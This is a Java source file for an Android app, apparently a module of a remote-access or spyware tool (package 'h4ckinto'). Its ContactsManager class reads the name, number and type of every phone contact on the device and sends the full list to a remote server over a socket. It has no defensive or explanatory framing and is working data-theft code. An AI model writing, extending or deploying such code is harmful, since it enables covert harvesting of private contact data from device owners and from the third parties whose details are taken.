package com.h4ckinto.android.managers;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

import com.h4ckinto.android.network.SocketManager;
import com.h4ckinto.android.utils.PermissionManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class ContactsManager {
    private static final String TAG = "ContactsManager";
    
    private Context context;
    private SocketManager socketManager;

    public ContactsManager(Context context) {
        this.context = context;
        this.socketManager = SocketManager.getInstance(context);
    }

    public void getContactsList() {
        if (!PermissionManager.hasContactsPermission(context)) {
            Log.w(TAG, "Contacts permission not granted");
            return;
        }

        try {
            List<JSONObject> contactsList = new ArrayList<>();
            
            Cursor cursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                    ContactsContract.CommonDataKinds.Phone.TYPE
                },
                null,
                null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            );

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phoneNumber = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.TYPE));
                    
                    // Clean phone number
                    phoneNumber = phoneNumber.replaceAll("[^0-9+]", "");
                    
                    JSONObject contact = new JSONObject();
                    contact.put("name", name);
                    contact.put("phoneNo", phoneNumber);
                    contact.put("type", getPhoneTypeString(type));
                    contactsList.add(contact);
                }
                cursor.close();
            }

            JSONObject contactsData = new JSONObject();
            contactsData.put("contactsList", new JSONArray(contactsList));
            socketManager.sendContactsData(contactsData);
            
            Log.d(TAG, "Contacts list sent to server: " + contactsList.size() + " contacts");
        } catch (Exception e) {
            Log.e(TAG, "Error getting contacts list", e);
        }
    }

    private String getPhoneTypeString(int type) {
        switch (type) {
            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
                return "Mobile";
            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
                return "Home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
                return "Work";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK:
                return "Fax Work";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME:
                return "Fax Home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_PAGER:
                return "Pager";
            case ContactsContract.CommonDataKinds.Phone.TYPE_OTHER:
                return "Other";
            default:
                return "Unknown";
        }
    }
}
